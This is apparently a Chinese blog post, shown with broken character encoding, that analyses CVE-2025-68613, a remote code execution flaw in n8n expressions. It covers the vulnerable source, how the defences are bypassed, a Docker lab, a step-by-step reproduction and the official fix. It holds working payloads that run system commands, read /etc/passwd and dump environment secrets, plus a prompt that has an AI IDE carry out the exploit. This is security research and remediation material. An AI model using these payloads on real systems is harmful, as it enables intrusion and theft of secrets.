---
title: "CVE-2025-68613: n8n è¡¨è¾¾å¼æ³¨å…¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æä¸å¤ç°"
author: "bx"
description: "n8næœªæˆæƒRCEæ¼æ´(CVE-2025-68613)æ·±åº¦åˆ†æä¸å¤ç°ã€‚åŒ…å«ç¯å¢ƒæ­å»ºã€æ¼æ´åŸç†ã€Payloadæ„é€ åŠå®˜æ–¹ä¿®å¤æ–¹æ¡ˆåˆ†æã€‚"
pubDatetime: 2026-01-18
tags:
  - "n8n"
  - "CVE-2025-68613"
  - "RCE"
  - "æ¼æ´å¤ç°"
  - "å®‰å…¨åˆ†æ"
draft: false
slug: "n8n-cve-2025-68613-analysis"
---
import Bilibili from '../../components/Bilibili.astro'

<meta name="referrer" content="no-referrer" />

# CVE-2025-68613: n8n è¡¨è¾¾å¼æ³¨å…¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æä¸å¤ç°

## ğŸ“‹ æ¦‚è¿°

n8n æ˜¯ä¸€æ¬¾æµè¡Œçš„å¼€æºå·¥ä½œæµè‡ªåŠ¨åŒ–å¹³å°ï¼Œç±»ä¼¼äº Zapier çš„å¯è‡ªéƒ¨ç½²æ›¿ä»£æ–¹æ¡ˆã€‚2025å¹´1æœˆï¼Œè¯¥é¡¹ç›®æŠ«éœ²äº†å¤šä¸ªé«˜å±å®‰å…¨æ¼æ´ï¼Œå…¶ä¸­ **CVE-2025-68613** æœ€ä¸ºä¸¥é‡ï¼Œå…è®¸æ‹¥æœ‰å·¥ä½œæµç¼–è¾‘æƒé™çš„æ”»å‡»è€…é€šè¿‡è¡¨è¾¾å¼æ³¨å…¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

### æ¼æ´ä¿¡æ¯

| é¡¹ç›® | è¯¦æƒ… |
|------|------|
| **CVEç¼–å·** | CVE-2025-68613 |
| **CVSSè¯„åˆ†** | 9.9-10.0ï¼ˆä¸¥é‡ï¼‰ |
| **å½±å“ç‰ˆæœ¬** | n8n < 1.120.4, < 1.121.1, < 1.122.0 |
| **æ¼æ´ç±»å‹** | è¡¨è¾¾å¼æ³¨å…¥ â†’ è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) |
| **å‰ç½®æ¡ä»¶** | éœ€è¦å·¥ä½œæµç¼–è¾‘æƒé™ |
| **ä¿®å¤ç‰ˆæœ¬** | n8n >= 1.120.4, >= 1.121.1, >= 1.122.0 |

**é¡¹ç›®åœ°å€**: https://github.com/n8n-io/n8n

---

## æ¼æ´åˆ†æ

### æºç è·å–

é¦–å…ˆå…‹éš† n8n æ¼æ´ç‰ˆæœ¬ï¼š

```bash
# å…‹éš†ä»“åº“
git clone https://github.com/n8n-io/n8n.git
cd n8n

# åˆ‡æ¢åˆ°æ˜“å—æ”»å‡»ç‰ˆæœ¬
git checkout tags/n8n@1.120.0
```

### æ ¸å¿ƒæ¼æ´ä»£ç 

`packages/workflow/src/expression.ts`  

è¯¥æ–¹æ³•è´Ÿè´£è§£æå’Œæ‰§è¡Œ n8n å·¥ä½œæµä¸­çš„è¡¨è¾¾å¼ï¼ˆä»¥ `{{ }}` åŒ…è£¹çš„ä»£ç ï¼‰ã€‚


```typescript
resolveSimpleParameterValue(
    parameterValue: NodeParameterValue,
    siblingParameters: INodeParameters,
    runExecutionData: IRunExecutionData | null,
    runIndex: number,
    itemIndex: number,
    activeNodeName: string,
    connectionInputData: INodeExecutionData[],
    mode: WorkflowExecuteMode,
    additionalKeys: IWorkflowDataProxyAdditionalKeys,
    executeData?: IExecuteData,
    returnObjectAsString = false,
    selfData = {},
    contextNodeName?: string,
): NodeParameterValue | INodeParameters | NodeParameterValue[] | INodeParameters[] {
    // æ£€æŸ¥æ˜¯å¦ä¸ºè¡¨è¾¾å¼
    if (!isExpression(parameterValue)) {
        return parameterValue;
    }

    // ç§»é™¤ = ç¬¦å·
    parameterValue = parameterValue.substr(1);

    // åˆ›å»ºæ•°æ®ä»£ç† - æ„å»ºè¡¨è¾¾å¼æ‰§è¡Œä¸Šä¸‹æ–‡
    const dataProxy = new WorkflowDataProxy(
        this.workflow,
        runExecutionData,
        runIndex,
        itemIndex,
        activeNodeName,
        connectionInputData,
        siblingParameters,
        mode,
        additionalKeys,
        executeData,
        -1,
        selfData,
        contextNodeName,
    );
    const data = dataProxy.getDataProxy();

    // æ¼æ´ç‚¹ï¼šä¸å®‰å…¨åœ°æš´éœ² process å¯¹è±¡
    // Support only a subset of process properties
    data.process =
        typeof process !== 'undefined'
            ? {
                    arch: process.arch,
                    env: process.env.N8N_BLOCK_ENV_ACCESS_IN_NODE === 'true' ? {} : process.env,
                    platform: process.platform,
                    pid: process.pid,
                    ppid: process.ppid,
                    release: process.release,
                    version: process.pid,
                    versions: process.versions,
                }
            : {};

    Expression.initializeGlobalContext(data);

    // æ·»åŠ è¡¨è¾¾å¼æ‰©å±•
    data.extend = extend;
    data.extendOptional = extendOptional;
    data[sanitizerName] = sanitizer;
    Object.assign(data, extendedFunctions);

    // æ„é€ å‡½æ•°æ£€æµ‹ï¼ˆå¯è¢«ç»•è¿‡ï¼‰
    const constructorValidation = new RegExp(/\.\s*constructor/gm);
    if (parameterValue.match(constructorValidation)) {
        throw new ExpressionError('Expression contains invalid constructor function call', {
            causeDetailed: 'Constructor override attempt is not allowed due to security concerns',
            runIndex,
            itemIndex,
        });
    }

    // æ‰§è¡Œè¡¨è¾¾å¼
    const extendedExpression = extendSyntax(parameterValue);
    const returnValue = this.renderExpression(extendedExpression, data);
    
    if (typeof returnValue === 'function') {
        if (returnValue.name === 'DateTime')
            throw new ApplicationError('this is a DateTime, please access its methods');
        throw new ApplicationError('this is a function, please add ()');
    } else if (typeof returnValue === 'string') {
        return returnValue;
    } else if (returnValue !== null && typeof returnValue === 'object') {
        if (returnObjectAsString) {
            return this.convertObjectValueToString(returnValue);
        }
    }

    return returnValue;
}
```

### æ¼æ´æ ¹å› 

æ¼æ´çš„æ ¸å¿ƒé—®é¢˜åœ¨äº **ç¬¬ 68-81 è¡Œçš„ `process` å¯¹è±¡æš´éœ²**ï¼š

```typescript
// CVE-2025-68613 æ ¸å¿ƒæ¼æ´ä»£ç 
data.process =
    typeof process !== 'undefined'
        ? {
                arch: process.arch,
                env: process.env.N8N_BLOCK_ENV_ACCESS_IN_NODE === 'true' ? {} : process.env,
                platform: process.platform,
                pid: process.pid,
                ppid: process.ppid,
                release: process.release,
                version: process.pid,
                versions: process.versions,
            }
        : {};
```

**é—®é¢˜æ±‡æ€»**ï¼š

1. **æµ…æ‹·è´é—®é¢˜**: ä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡åŒ…å« `process` çš„éƒ¨åˆ†å±æ€§ï¼Œä½†è¯¥å¯¹è±¡**ä»ç„¶ä¿ç•™äº†å¯¹åŸå§‹ `process` å¯¹è±¡çš„åŸå‹é“¾å¼•ç”¨**

2. **åŸå‹é“¾æ³„éœ²**: è™½ç„¶åªæš´éœ²äº†éƒ¨åˆ†å±æ€§ï¼Œä½†æ”»å‡»è€…å¯ä»¥é€šè¿‡åŸå‹é“¾è®¿é—®å®Œæ•´çš„ `process` å¯¹è±¡ï¼š
   ```javascript
   data.process â†’ Object.prototype â†’ process.mainModule â†’ require()
   ```

3. **ç¼ºå°‘åŸå‹éš”ç¦»**: æ²¡æœ‰ä½¿ç”¨ `Object.create(null)` åˆ›å»ºæ— åŸå‹å¯¹è±¡ï¼Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“æ”»å‡»æˆä¸ºå¯èƒ½

4. **`this` ä¸Šä¸‹æ–‡æ³„éœ²**: åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨ `this` å¯ä»¥è®¿é—®åˆ°æ•´ä¸ªæ•°æ®ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ŒåŒ…æ‹¬ `process`



## ç°æœ‰é˜²æŠ¤æœºåˆ¶åˆ†æ

n8n åœ¨ `Expression.ts` ä¸­å®ç°äº†å¤šå±‚é˜²æŠ¤ï¼Œä½†å‡å¯è¢«ç»•è¿‡ï¼š

### é˜²æŠ¤1: å…¨å±€å¯¹è±¡åå• 

```typescript
// Prevent Remote Code Execution
data.eval = {};
data.uneval = {};
data.setTimeout = {};
data.setInterval = {};
data.Function = {};

// Prevent requests
data.fetch = {};
data.XMLHttpRequest = {};

// Prevent control abstraction
data.Promise = {};
data.Generator = {};
data.AsyncFunction = {};

// Prevent Reflection
data.Reflect = {};
data.Proxy = {};
```

é€šè¿‡ `this.process.mainModule.require()` åŸå‹é“¾è®¿é—®ï¼Œä¸è§¦å‘é»‘åå•æ£€æµ‹

### é˜²æŠ¤2: æ„é€ å‡½æ•°æ£€æµ‹ (93-100è¡Œ)

```typescript
const constructorValidation = new RegExp(/\.\s*constructor/gm);
if (parameterValue.match(constructorValidation)) {
    throw new ExpressionError('Expression contains invalid constructor function call', {
        causeDetailed: 'Constructor override attempt is not allowed due to security concerns',
    });
}
```

ä¸»è¦ç›®çš„æ˜¯é˜»æ­¢ä½¿ç”¨ `.constructor` å…³é”®å­—è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œä½¿ç”¨ `this.process.mainModule.require` ä¸åŒ…å« "constructor" å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™æ£€æµ‹

### é˜²æŠ¤3: ç¯å¢ƒå˜é‡è®¿é—®æ§åˆ¶ï¼ˆé»˜è®¤æœªå¯ç”¨ï¼‰

```typescript
env: process.env.N8N_BLOCK_ENV_ACCESS_IN_NODE === 'true' ? {} : process.env
```

### é˜²æŠ¤æ€»ç»“

| é˜²æŠ¤æœºåˆ¶ | å¯ç»•è¿‡ | ç»•è¿‡æ–¹æ³• |
|---------|-------|---------|
| å…¨å±€å¯¹è±¡é»‘åå• | keyi | é€šè¿‡åŸå‹é“¾é—´æ¥è®¿é—® |
| æ„é€ å‡½æ•°æ£€æµ‹ | keyi | ä½¿ç”¨ä¸å« "constructor" çš„è·¯å¾„ |
| ç¯å¢ƒå˜é‡æ§åˆ¶ | keyi | ä»å¯è®¿é—® `mainModule.require()` |



## æ”»å‡» Payload æ„é€ 

### åŸºç¡€ Payload

```javascript
{{ (function(){ 
    return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() 
})() }}
```

### å…¶ä»– Payload ç¤ºä¾‹

#### 1. æ‰§è¡Œ whoami å‘½ä»¤

```javascript
{{ (function(){ 
    return this.process.mainModule.require('child_process').execSync('whoami').toString() 
})() }}
```

#### 2. åˆ—å‡ºç›®å½•å†…å®¹

```javascript
{{ (function(){ 
    return this.process.mainModule.require('child_process').execSync('ls -la /').toString() 
})() }}
```

#### 3. è¯»å–ç¯å¢ƒå˜é‡ï¼ˆè·å–æ•æ„Ÿé…ç½®ï¼‰

```javascript
{{ (function(){ 
    return JSON.stringify(this.process.env, null, 2) 
})() }}
```

#### 4. è¯»å–æ–‡ä»¶ç³»ç»Ÿï¼ˆWindowsï¼‰

```javascript
{{ (function(){ 
    const fs = this.process.mainModule.require('fs');
    return fs.readFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts', 'utf8');
})() }}
```

## æ¼æ´å¤ç°

### ç¯å¢ƒæ­å»º

#### æ–¹æ³•1: Docker run

```bash
# æ‹‰å–æ˜“å—æ”»å‡»çš„ç‰ˆæœ¬
docker pull n8nio/n8n:1.120.0

# å¯åŠ¨å®¹å™¨
docker run -d \
  --name n8n-vulnerable \
  -p 5678:5678 \
  -e N8N_BASIC_AUTH_ACTIVE=true \
  -e N8N_BASIC_AUTH_USER=admin \
  -e N8N_BASIC_AUTH_PASSWORD=admin123 \
  n8nio/n8n:1.120.0

# æŸ¥çœ‹æ—¥å¿—
docker logs n8n-vulnerable -f
```

#### æ–¹æ³•2: Docker Compose

åˆ›å»º `docker-compose.yml`:

```yaml
version: '3.8'

services:
  n8n-vulnerable:
    image: n8nio/n8n:1.120.0  # æ˜“å—æ”»å‡»ç‰ˆæœ¬
    container_name: cve-2025-68613-n8n
    ports:
      - "5678:5678"
    environment:
      # åŸºæœ¬è®¤è¯
      - N8N_BASIC_AUTH_ACTIVE=true
      - N8N_BASIC_AUTH_USER=admin
      - N8N_BASIC_AUTH_PASSWORD=admin123
      
      # æœåŠ¡å™¨é…ç½®
      - N8N_HOST=localhost
      - N8N_PORT=5678
      - N8N_PROTOCOL=http
      
      # æ‰§è¡Œæ¨¡å¼
      - EXECUTIONS_MODE=main
    volumes:
      - n8n_data:/home/node/.n8n
    restart: unless-stopped

volumes:
  n8n_data:
```

å¯åŠ¨æœåŠ¡ï¼š

```bash
# å¯åŠ¨
docker-compose up -d

# æŸ¥çœ‹æ—¥å¿—
docker-compose logs -f

# åœæ­¢
docker-compose down

# å®Œå…¨æ¸…ç†ï¼ˆåˆ é™¤æ•°æ®ï¼‰
docker-compose down -v
```

è®¿é—®åœ°å€: **http://localhost:5678**

### åˆ©ç”¨æ­¥éª¤

#### Step 1: ç™»å½• n8n

ä½¿ç”¨æˆ‘ä»¬æ³¨å†Œçš„å‡­æ®ç™»å½•ï¼š
- **ç”¨æˆ·å**: `admin@admin.com`
- **å¯†ç **: `admin123`

![n8n ç™»å½•ç•Œé¢](https://cdn.nlark.com/yuque/0/2026/png/42994824/1768740706071-64a31492-44b2-47aa-8318-73a0cca1e1a7.png)

#### Step 2: åˆ›å»ºå·¥ä½œæµ

ç‚¹å‡» **"Add workflow"** æˆ–ä¸»é¡µçš„ **"Create workflow"** æŒ‰é’®åˆ›å»ºæ–°å·¥ä½œæµ

![åˆ›å»ºå·¥ä½œæµ](https://cdn.nlark.com/yuque/0/2026/png/42994824/1768740706016-dc0fd7f8-dd17-4717-b926-f810746bc7bd.png)

#### Step 3: æ·»åŠ èŠ‚ç‚¹

å·¥ä½œæµéœ€è¦ä¸¤ä¸ªèŠ‚ç‚¹ï¼š

1. **Manual Trigger** - æ‰‹åŠ¨è§¦å‘èŠ‚ç‚¹
   
2. **Edit Fields (Set)** - è®¾ç½®å­—æ®µèŠ‚ç‚¹ï¼ˆç”¨äºæ³¨å…¥ payloadï¼‰

![æ·»åŠ èŠ‚ç‚¹](https://cdn.nlark.com/yuque/0/2026/png/42994824/1768740705897-c496a201-f2b4-4154-9e66-70f7eef30d04.png)

#### Step 4: æ³¨å…¥ RCE Payload

åœ¨ **Edit Fields (Set)** èŠ‚ç‚¹ä¸­é…ç½®ï¼š

1. **å­—æ®µåç§°** (`Name`): è¾“å…¥ `result`
2. **å­—æ®µå€¼** (`Value`): ç‚¹å‡»å³ä¾§çš„ **fx** æŒ‰é’®åˆ‡æ¢åˆ°**è¡¨è¾¾å¼æ¨¡å¼**ï¼Œè¾“å…¥ä»¥ä¸‹ Payloadï¼š

```javascript
{{ (function(){ 
    return this.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() 
})() }}
```

![é…ç½® Payload](https://cdn.nlark.com/yuque/0/2026/png/42994824/1768740706396-25c38ba6-ba1f-4630-8a0b-8ae7781e2b56.png)

#### Step 5: æ‰§è¡Œå·¥ä½œæµ

ç‚¹å‡»å³ä¸Šè§’çš„ **"Test workflow"** æˆ– **"Execute Workflow"** æŒ‰é’®

#### Step 6: éªŒè¯ç»“æœ

æ‰§è¡ŒæˆåŠŸåï¼Œå¯ä»¥åœ¨è¾“å‡ºé¢æ¿ä¸­çœ‹åˆ° `/etc/passwd` æ–‡ä»¶çš„å®Œæ•´å†…å®¹ï¼š

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

![æ‰§è¡Œç»“æœ](https://cdn.nlark.com/yuque/0/2026/png/42994824/1768740705914-022b95d2-769a-4fb2-ad2c-6761e01deaf8.png)

âœ… **æ¼æ´å¤ç°æˆåŠŸï¼** æˆåŠŸåœ¨ n8n å®¹å™¨å†…æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤å¹¶è¯»å–äº†æ•æ„Ÿæ–‡ä»¶ã€‚

---

## ä½¿ç”¨ Antigravity AI è‡ªåŠ¨åŒ–å¤ç°

Google æ–°æ¨å‡ºçš„ **Antigravity AI IDE** å…·æœ‰å¼ºå¤§çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–èƒ½åŠ›ï¼Œå¯ä»¥é€šè¿‡è‡ªç„¶è¯­è¨€æŒ‡ä»¤è‡ªåŠ¨å®Œæˆæ¼æ´å¤ç°çš„å…¨è¿‡ç¨‹ã€‚

### è‡ªåŠ¨åŒ–å¤ç°æ­¥éª¤

ä½¿ç”¨ä»¥ä¸‹ Antigravity æç¤ºè¯ï¼šï¼ˆè¿™ä¸ªæ˜¯æˆ‘ä»¬å¼ºåˆ¶è¦æ±‚çš„ï¼‰

> å€ŸåŠ©æœç´¢èƒ½åŠ›å…¶å®anti-gravityå¯ä»¥è‡ªåŠ¨æ”¶é›†æ¼æ´ä¿¡æ¯è¿›è¡Œæ¼æ´å°è¯•

```plaintext
å¸®æˆ‘å¤ç° n8n CVE-2025-68613 æ¼æ´ï¼Œè¯¦ç»†æ­¥éª¤å¦‚ä¸‹ï¼š

1. åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ http://localhost:5678
2. ä½¿ç”¨ admin/admin123 ç™»å½•
3. åˆ›å»ºæ–°å·¥ä½œæµ
4. æ·»åŠ  Manual Trigger èŠ‚ç‚¹
5. æ·»åŠ  Edit Fields (Set) èŠ‚ç‚¹å¹¶è¿æ¥
6. åœ¨ Edit Fields èŠ‚ç‚¹ä¸­ï¼š
   - å­—æ®µå: result
   - åˆ‡æ¢åˆ°è¡¨è¾¾å¼æ¨¡å¼
   - æ³¨å…¥ Payload
7. æ‰§è¡Œå·¥ä½œæµ
8. éªŒè¯è¾“å‡ºç»“æœå¹¶æˆªå›¾
9. ç”Ÿæˆå®Œæ•´çš„å¤ç°è§†é¢‘
```

Antigravity ä¼šè‡ªåŠ¨å®Œæˆæ•´ä¸ªæµç¨‹
### æ¼”ç¤ºè§†é¢‘

å®Œæ•´çš„è‡ªåŠ¨åŒ–å¤ç°è¿‡ç¨‹å·²å½•åˆ¶æˆè§†é¢‘ï¼š

**Bç«™è§†é¢‘é“¾æ¥**: [n8n CVE-2025-68613 è‡ªåŠ¨åŒ–æ¼æ´å¤ç°æ¼”ç¤º](https://www.bilibili.com/video/BV1V7rUBhEzW/)

<Bilibili bvid="BV1V7rUBhEzW" />



## ä¿®å¤åˆ†æå’Œå»ºè®® 

### å®˜æ–¹ä¿®å¤æ–¹æ¡ˆï¼ˆv1.122.0ï¼‰

å®˜æ–¹é€šè¿‡ **AST é™æ€åˆ†æ** ä¿®å¤æ¼æ´ï¼Œæ ¸å¿ƒæ˜¯ç¦æ­¢è®¿é—®å±é™©çš„åŸå‹é“¾å±æ€§ã€‚

#### æ ¸å¿ƒä¿®å¤ä»£ç 

**1. å±é™©å±æ€§é»‘åå•** (`packages/workflow/src/utils.ts`)

```typescript
const unsafeObjectProperties = new Set([
    '__proto__',
    'prototype', 
    'constructor',
    'getPrototypeOf'
]);

export function isSafeObjectProperty(property: string) {
    return !unsafeObjectProperties.has(property);
}
```

**2. AST åŸå‹é“¾æ£€æµ‹å™¨** (`packages/workflow/src/expression-sandboxing.ts`)

```typescript
export const PrototypeSanitizer: ASTAfterHook = (ast, dataNode) => {
    astVisit(ast, {
        visitMemberExpression(path) {
            const node = path.node;
            
            // æ£€æŸ¥é™æ€å±æ€§: obj.property
            if (!node.computed) {
                if (!isSafeObjectProperty(node.property.name)) {
                    throw new ExpressionError(
                        `Cannot access "${node.property.name}" due to security concerns`
                    );
                }
            }
            // æ£€æŸ¥å­—ç¬¦ä¸²å­—é¢é‡: obj['property']
            else if (node.property.type === 'StringLiteral') {
                if (!isSafeObjectProperty(node.property.value)) {
                    throw new ExpressionError(
                        `Cannot access "${node.property.value}" due to security concerns`
                    );
                }
            }
            // åŠ¨æ€å±æ€§åŒ…è£…ä¸ºè¿è¡Œæ—¶æ£€æŸ¥: obj[expr] â†’ obj[sanitizer(expr)]
            else {
                path.replace(
                    b.memberExpression(node.object, 
                        b.callExpression(sanitizerIdentifier, [node.property]),
                        true
                    )
                );
            }
        },
    });
};
```

**3. Tournament æ²™ç®±å¼•æ“** (`packages/workflow/src/expression-evaluator-proxy.ts`)

```typescript
const tournamentEvaluator = new Tournament(errorHandler, undefined, undefined, {
    before: [FunctionThisSanitizer],     // æ¸…ç† this ç»‘å®šï¼ˆä¸¥æ ¼æ¨¡å¼ï¼‰
    after: [PrototypeSanitizer, DollarSignValidator]  // æ£€æŸ¥å±é™©å±æ€§
});
```

#### ä¿®å¤æœºåˆ¶

1. **FunctionThisSanitizer**: åœ¨ IIFE ä¸­æ’å…¥ `'use strict'`ï¼Œä½¿ `this` ä¸º `undefined`

2. **PrototypeSanitizer**: åœ¨æ‰§è¡Œå‰éå† ASTï¼Œé˜»æ­¢è®¿é—®åŸå‹é“¾å±æ€§

3. **è¿è¡Œæ—¶æ£€æŸ¥**: åŠ¨æ€å±æ€§è®¿é—®åŒ…è£…ä¸º `sanitizer()` è°ƒç”¨

åŸå§‹ Payload `this.process.mainModule` è¢«é˜»æ­¢çš„åŸå› ï¼š
1. ä¸¥æ ¼æ¨¡å¼ä¸‹ `this` ä¸º `undefined`
2. å³ä½¿ç»•è¿‡ï¼Œ`prototype`/`constructor` ç­‰è®¿é—®ä¼šè¢« AST æ£€æµ‹é˜»æ­¢

### å‡çº§å»ºè®®

```bash
npm update n8n -g
```

